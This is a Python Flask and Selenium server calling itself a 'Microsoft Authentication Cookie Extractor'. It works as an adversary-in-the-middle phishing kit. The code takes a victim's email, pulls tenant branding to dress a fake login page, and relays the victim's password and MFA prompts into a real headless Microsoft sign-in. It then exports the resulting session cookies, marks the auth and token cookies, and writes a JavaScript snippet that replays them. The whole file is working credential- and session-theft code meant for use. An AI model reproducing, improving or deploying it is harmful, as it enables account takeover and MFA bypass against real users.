"""
Unified Flask + Socket.IO server with Selenium automation (single exposed PORT).

Key fixes applied:
- Added missing imports: request, join_room
- Added defensive cleanup and session tracking helpers
- Normalized thread usage and room joining
- Reduced unused imports (removed asyncio, base64, Keys)
- Added graceful shutdown hooks and error logging consistency
- Ensured cookies + profile directories are created once at startup
- Added guard rails against malformed client messages
- Centralized session cleanup logic
"""

from flask import Flask, send_from_directory, request
from flask_socketio import SocketIO, emit, join_room
import os
import json
import threading
import requests
import pickle
from time import sleep
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service

# ------------------------------------------------------------------------------
# Configuration
# ------------------------------------------------------------------------------

app = Flask(__name__)
app.config['SECRET_KEY'] = 'change-this-secret'
# For Railway + Gunicorn w/ eventlet worker you can set async_mode='eventlet'.
# If you run directly via python main.py this threading mode still works, but
# eventlet is preferred in production for true WebSocket concurrency.
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Active sessions keyed by Socket.IO sid
# Structure:
# {
#   sid: {
#       'driver': Selenium WebDriver or None,
#       'status': str,
#       'username': str (optional)
#   }
# }
active_sessions = {}

# ------------------------------------------------------------------------------
# Utility: Selenium / Browser Setup
# ------------------------------------------------------------------------------

def setup_chrome_for_railway():
    chrome_options = Options()
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--remote-debugging-port=9222')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    return chrome_options

# ------------------------------------------------------------------------------
# Cookie Conversion Utilities
# ------------------------------------------------------------------------------

def convert_json_cookies_to_js(json_cookies_data):
    if isinstance(json_cookies_data, str):
        data = json.loads(json_cookies_data)
    else:
        data = json_cookies_data

    cookies = data.get('cookies', [])
    js_cookies = []
    for cookie in cookies:
        domain = cookie.get('domain', '').lstrip('.')
        js_cookies.append({
            "name": cookie.get('name', ''),
            "path": cookie.get('path', '/').replace('/', r'\/'),
            "value": cookie.get('value', ''),
            "domain": domain,
            "secure": cookie.get('secure', False),
            "max_age": 31536000,
            "httponly": cookie.get('httpOnly', False),
            "samesite": cookie.get('sameSite')
        })

    js_code = f"""(() => {{
        let cookies = {json.dumps(js_cookies, separators=(',', ':'))};
        function setCookie(key, value, domain, path, isSecure) {{
          const cookieMaxAge = 'Max-Age=31536000';
          if (key.startsWith('__Host')) {{
            document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=/;Secure;SameSite=None';
          }} else if (key.startsWith('__Secure')) {{
            document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
          }} else {{
            if (isSecure) {{
              if (window.location.hostname == domain)
                document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
              else
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
            }} else {{
              if (window.location.hostname == domain)
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
              else
                document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
            }}
          }}
        }}
        for (let c of cookies) setCookie(c.name, c.value, c.domain, c.path, c.secure);
      }})();"""
    return js_code

# ------------------------------------------------------------------------------
# Page State Detection Helpers
# ------------------------------------------------------------------------------

def mm_1(driver):
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_1_v(driver):
    try:
        accept_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "acceptButton")))
        accept_button.click()
        sleep(5)
        driver.quit()
        return True
    except Exception as e:
        print(f"[mm_1_v] ERROR: {e}")
        try: driver.quit()
        except: pass
        return False

def mm_2(driver):
    try:
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "i0118Error")))
        return True
    except:
        return False

def mm_3(driver):
    try:
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
        return True
    except:
        return False

def mm_3_v(driver):
    try:
        sleep(15)
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def mm_4(driver):
    try:
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.ID, "idDiv_SAOTCAS_Description")))
        WebDriverWait(driver, 6).until(EC.presence_of_element_located((By.ID, "idSpan_SAOTCAS_DescSessionID")))
        return True
    except:
        return False

def mm_4_v(driver):
    try:
        sleep(15)
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "acceptButton")))
        return True
    except:
        return False

def is_login_successful(driver):
    try:
        url = driver.current_url
        print(f"[LOGIN CHECK] URL: {url}")
        if any(x in url for x in [
            "outlook.office365.com", "owa", "mail", "office.com", "microsoftonline.com"
        ]):
            return True
        page = driver.page_source.lower()
        if any(x in page for x in ["sign out", "logout", "inbox", "calendar"]):
            return True
        if any(x in page for x in ["error", "invalid", "incorrect", "wrong password"]):
            return False
        return False
    except Exception as e:
        print(f"[LOGIN CHECK] ERROR: {e}")
        return False

# ------------------------------------------------------------------------------
# Cookie Export
# ------------------------------------------------------------------------------

def save_cookies(driver, session_id):
    try:
        cookies = driver.get_cookies()
        map_dir = os.path.join(os.getcwd(), "map", session_id)
        os.makedirs(map_dir, exist_ok=True)

        # Pickle
        with open(os.path.join(map_dir, "cookies.pkl"), 'wb') as f:
            pickle.dump(cookies, f)

        # JSON ready
        safe_cookies = []
        for c in cookies:
            nc = c.copy()
            for k, v in nc.items():
                if not isinstance(v, (str, int, float, bool, type(None))):
                    nc[k] = str(v)
            safe_cookies.append(nc)

        json_path = os.path.join(map_dir, "cookies.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump({
                "export_date": datetime.now().isoformat(),
                "total_cookies": len(cookies),
                "cookies": safe_cookies
            }, f, indent=2)

        js_code = convert_json_cookies_to_js({"cookies": safe_cookies})
        with open(os.path.join(map_dir, "cookies_script.js"), 'w', encoding='utf-8') as f:
            f.write(js_code)

        summary_path = os.path.join(map_dir, "cookies_summary.txt")
        domains = {}
        for c in cookies:
            d = c.get('domain', 'unknown')
            domains[d] = domains.get(d, 0) + 1
        important = [
            c for c in cookies
            if any(x in c.get('name', '').lower()
                   for x in ['auth', 'token', 'session', 'access', 'refresh', 'login'])
        ]
        with open(summary_path, 'w', encoding='utf-8') as f:
            f.write("Cookie Export Summary\n=====================\n")
            f.write(f"Export Date: {datetime.now().isoformat()}\n")
            f.write(f"Total Cookies: {len(cookies)}\n")
            f.write("Domains:\n")
            for d, count in domains.items():
                f.write(f"  - {d}: {count}\n")
            f.write("\nImportant Cookies:\n")
            for c in important:
                f.write(f"  - {c.get('name')} (Domain: {c.get('domain')})\n")

        print(f"[COOKIES] Saved for session {session_id}")
        return True
    except Exception as e:
        print(f"[COOKIES] ERROR: {e}")
        return False

# ------------------------------------------------------------------------------
# Session Management
# ------------------------------------------------------------------------------

def cleanup_session(session_id, reason=None):
    sess = active_sessions.pop(session_id, None)
    if sess:
        drv = sess.get('driver')
        if drv:
            try:
                drv.quit()
            except:
                pass
    if reason:
        print(f"[SESSION CLEANUP] {session_id} ({reason})")
    else:
        print(f"[SESSION CLEANUP] {session_id}")

# ------------------------------------------------------------------------------
# Browser Automation Thread
# ------------------------------------------------------------------------------

def handle_browser_automation(initial_message, session_id):
    try:
        parts = initial_message.split(":")
        username = parts[1]
        base_dir = os.getcwd()
        map_dir = os.path.join(base_dir, "map", session_id)
        storage_dir = os.path.join(base_dir, "Storage", session_id)
        os.makedirs(map_dir, exist_ok=True)
        os.makedirs(storage_dir, exist_ok=True)

        print(f"[BROWSER] Session {session_id} username={username}")
        chrome_options = setup_chrome_for_railway()
        chrome_options.add_argument(f"user-data-dir={storage_dir}")
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)

        # Update session entry
        if session_id not in active_sessions:
            active_sessions[session_id] = {}
        active_sessions[session_id].update({
            'driver': driver,
            'username': username,
            'status': 'browser_opened'
        })

        url = (
            "https://login.microsoftonline.com/common/oauth2/authorize?"
            "client_id=00000002-0000-0ff1-ce00-000000000000&"
            "redirect_uri=https%3a%2f%2foutlook.office365.com%2fowa%2f&"
            "resource=00000002-0000-0ff1-ce00-000000000000&"
            "response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&"
            "msaredir=1&client-request-id=27773165-9160-1898-04aa-bf3c4164d7f9&protectedtoken=true&"
            "claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&"
            f"login_hint={username}&nonce=638588644641353721.6173dd1e-ebed-4c60-b413-fdb5a2238a04&"
            "state=DYsxEsAgCMCwXp9DFUHkO1..."
            "&sso_reload=true"
        )
        driver.get(url)
        print(f"[BROWSER] Opened login page for {username}")

        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "i0118")))
            active_sessions[session_id]['status'] = 'waiting_for_password'
            socketio.emit('message', 'need_password', room=session_id)
        except Exception:
            # Possibly already authenticated or error state
            if is_login_successful(driver):
                if save_cookies(driver, session_id):
                    socketio.emit('message', 'already_logged_in:cookies_saved', room=session_id)
                else:
                    socketio.emit('message', 'already_logged_in:cookies_failed', room=session_id)
                cleanup_session(session_id, "already_logged_in")
            else:
                socketio.emit('message', f'unexpected_page:{driver.current_url}', room=session_id)
    except Exception as e:
        print(f"[BROWSER THREAD] ERROR: {e}")
        socketio.emit('message', 'error:browser_error', room=session_id)
        cleanup_session(session_id, "browser_error")

# ------------------------------------------------------------------------------
# Flask Routes
# ------------------------------------------------------------------------------

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index.htm')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('.', path)

# ------------------------------------------------------------------------------
# Socket.IO Event Handlers
# ------------------------------------------------------------------------------

@socketio.on('connect')
def handle_connect():
    sid = request.sid
    print(f"[CONNECT] {sid}")
    active_sessions[sid] = {'driver': None, 'status': 'connected'}
    join_room(sid)

@socketio.on('disconnect')
def handle_disconnect():
    sid = request.sid
    print(f"[DISCONNECT] {sid}")
    cleanup_session(sid, "client_disconnected")

@socketio.on('message')
def handle_message(data):
    sid = request.sid
    print(f"[MESSAGE] sid={sid} data={data}")

    # Initial user detail message
    if data.startswith('ud:'):
        parts = data.split(":")
        if len(parts) < 3:
            emit('message', 'error:invalid_format')
            return

        username = parts[1]
        payload = {"username": username, "isOtherIdpSupported": True}

        try:
            resp = requests.post(
                "https://login.microsoftonline.com/common/GetCredentialType",
                json=payload, timeout=30
            )
            if resp.status_code == 200:
                try:
                    j = resp.json()
                    banner = (
                        f"{j.get('IfExistsResult','null')}:"
                        f"{j.get('EstsProperties',{}).get('UserTenantBranding',[{{}}])[0].get('BannerLogo','null')}:"
                        f"{j.get('EstsProperties',{}).get('UserTenantBranding',[{{}}])[0].get('Illustration','null')}:"
                        f"{j.get('EstsProperties',{}).get('UserTenantBranding',[{{}}])[0].get('BackgroundColor','null')}"
                    )
                except Exception:
                    banner = "null:null:null:null"
                emit('message', banner, room=sid)
            else:
                emit('message', 'error:request_failed', room=sid)
                return
        except Exception as e:
            print(f"[API] ERROR: {e}")
            emit('message', 'error:api_call_failed', room=sid)
            return

        # Launch browser thread
        t = threading.Thread(target=handle_browser_automation, args=(data, sid), daemon=True)
        t.start()
        return

    # Password submission
    if data.startswith('password:'):
        pwd = data.replace("password:", "", 1)
        sess = active_sessions.get(sid)
        if not sess or sess.get('status') != 'waiting_for_password':
            emit('message', 'error:invalid_state', room=sid)
            return
        driver = sess.get('driver')
        try:
            field = driver.find_element(By.ID, "i0118")
            field.clear()
            field.send_keys(pwd)

            btn = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, "idSIButton9")))
            btn.click()
            print(f"[PASSWORD] Submitted for {sid}")
            sleep(5)

            if mm_2(driver):
                emit('message', 'invalid_password', room=sid)
                sess['status'] = 'waiting_for_password'
                return

            sleep(2)

            # Multi-factor or state checks
            if mm_1(driver):
                emit('message', 'mm_1', room=sid)
                sess['status'] = 'mm_1'
                return
            if mm_3(driver):
                try:
                    text = driver.find_element(By.ID, "idRichContext_DisplaySign").text
                except:
                    text = "Sign in request"
                emit('message', f'mm_3:{text}', room=sid)
                sess['status'] = 'mm_3'
                return
            if mm_4(driver):
                try:
                    sid_text = driver.find_element(By.ID, "idSpan_SAOTCAS_DescSessionID").text
                except:
                    sid_text = "Session ID"
                emit('message', f'mm_4:{sid_text}', room=sid)
                sess['status'] = 'mm_4'
                return

            if is_login_successful(driver):
                if save_cookies(driver, sid):
                    emit('message', 'login_successful:cookies_saved', room=sid)
                else:
                    emit('message', 'login_successful:cookies_failed', room=sid)
                cleanup_session(sid, "login_complete")
            else:
                emit('message', 'login_failed', room=sid)

        except Exception as e:
            print(f"[PASSWORD PROCESS] ERROR: {e}")
            emit('message', 'error:password_processing_failed', room=sid)
        return

    # Action triggers for previously detected states
    sess = active_sessions.get(sid)
    if not sess:
        emit('message', 'error:unknown_session', room=sid)
        return

    driver = sess.get('driver')
    status = sess.get('status')

    if not driver:
        emit('message', 'error:no_driver', room=sid)
        return

    try:
        if status == 'mm_1' and mm_1_v(driver):
            emit('message', 'mm_1:success', room=sid)
            cleanup_session(sid, "mm_1_flow_done")
        elif status == 'mm_3' and mm_3_v(driver):
            emit('message', 'mm_3:success', room=sid)
            cleanup_session(sid, "mm_3_flow_done")
        elif status == 'mm_4' and mm_4_v(driver):
            emit('message', 'mm_4:success', room=sid)
            cleanup_session(sid, "mm_4_flow_done")
        else:
            emit('message', 'unknown_action', room=sid)
    except Exception as e:
        print(f"[ACTION] ERROR: {e}")
        emit('message', 'error:action_failed', room=sid)

# ------------------------------------------------------------------------------
# Entrypoint
# ------------------------------------------------------------------------------

if __name__ == "__main__":
    os.makedirs("map", exist_ok=True)
    os.makedirs("Storage", exist_ok=True)

    print("Microsoft Authentication Cookie Extractor")
    print("========================================")
    print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("Directories ready")
    print("Output Files per session:")
    print("  - cookies.pkl")
    print("  - cookies.json")
    print("  - cookies_script.js")
    print("  - cookies_summary.txt")
    print("Storage:")
    print("  - Cookies: ./map/{session_id}/")
    print("  - Browser profiles: ./Storage/{session_id}/")
    print("")

    port = int(os.environ.get("PORT", 8080))
    print(f"[SERVER] Listening on 0.0.0.0:{port}")
    # If deploying with Gunicorn + eventlet worker:
    #   gunicorn --worker-class eventlet -w 1 -b 0.0.0.0:$PORT main:app
    socketio.run(app, host="0.0.0.0", port=port, debug=False)
